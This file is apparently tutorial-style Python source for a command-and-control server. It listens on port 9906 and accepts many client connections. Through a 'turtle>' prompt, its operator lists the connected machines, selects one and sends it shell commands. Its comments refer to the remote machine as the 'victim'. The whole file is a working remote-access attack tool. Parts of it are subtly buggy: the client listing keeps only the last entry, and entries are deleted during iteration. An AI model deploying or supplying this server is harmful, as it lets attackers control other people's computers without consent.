import socket
import sys
import threading
import time
from queue import Queue

Number_of_Threads = 2
Job_Number = [1,2]         #Two tasks of server: 1. Sending commands to an already connected client. 2. Listen and accept connections from other clients.
queue = Queue()
all_connections = []
all_address = []

#used to implememt command line and terminal commands in python file
#1st thread starts here
#create a socket (connect two computers)
def create_socket():

    try:
        global host
        global port 
        global s
        host = ""
        port = 9906

        s = socket.socket()
    except socket.error as err:
        print("Socket creation error ",str(err))

# Binding the socket and listening for connections
def bind_socekt():
    try:
        global host
        global port
        global s

        print("Binding the Port Number: ",str(port))

        s.bind((host,port))
        s.listen(5)                  # 5 number means that the server will try to tolerate 5 connections at a time and if go bad it will show the error going in the exception stage

    except socket.error as err:
        print("Socket error message: " + str(err) + '\n' + "Retrying...")
        bind_socekt()

#Handling connections from multiple clients and saving to a list
#Closing previous connections when server.py file is restarted

def accepting_Connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn,address = s.accept()
            s.setblocking(1)             # prevents the server from timingout when not using it


            all_connections.append(conn)
            all_address.append(address)

            print("Connections has been established: " + address[0])

        except:
            print("Error accepting connections")

#2nd thread starts here:-
#2nd thread Functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
#Interactive prompt for sending commands
#turtle> list
#0 friend-A
#1 friend-B
#2 friend-C
#turtle> select 1

def start_turtle():


    while True:
        cmd = input('turtle> ')
        if cmd == "list":
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)

            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")

# Display all current active connections with the client
def list_connections():

    results = ''

    for i, conn in enumerate(all_connections):   #through enumerate the selecIDs will get selected in i
        try:
            conn.send(str.encode(' '))        #we are testing here of the connection by sending an empty string
            conn.recv(201400)                 #the bytes are huge because we dont know how much data we may receive

        except:
            del all_connections[i]            #if we dont rx anything above this will delete that particular connection
            del all_address[i]
            continue

        results = str(i) + "  " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + '\n'

    print("----Clients-----" + "\n" + results)

#select
def get_target(cmd):
    try:
        target = cmd.replace("select ",'')   #target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to: " + str(all_address[target][0]))
        print(str(all_address[target][0]) + "> ",end='')          #Eg: 192.168.2.3>
        return conn

    except:
        print("Selection not valid")        #For eg. you are connected to 3 PCs and you are typing "Select 13" then this will come
        return None

# Send commands to client/victim or a friend
def send_target_commands(conn):

    while True:
        try:
            cmd = input()    # To take input/coomand from us and send it to the connection
            if cmd == 'quit':
                break                   #if 'quit' it will break out of the while loop and will go to the start_turtle() function where while is infinite and so will start over
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))                      #we are encoding data into bytes as we cannot tranfer data between computers in terms of string and can be tx as bytes only.
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response, end = '')
        except:
            print("Error sending commands")             #it will come when suppose you have written the right command but the victim has switched off his PC in between
            break                                       #if 'quit' it will break out of the while loop and will go to the start_turtle() function where while is infinite and so will start over and can see which connections are active from there

#create worker threads
def create_workers():

    for _ in range(Number_of_Threads):
          t = threading.Thread(target=work)
          t.daemon=True
          t.start()

#Do next job that is in the queue (handle connection, send commnans)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socekt()
            accepting_Connections()
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in Job_Number:
        queue.put(x)

    queue.join()

create_workers()
create_jobs()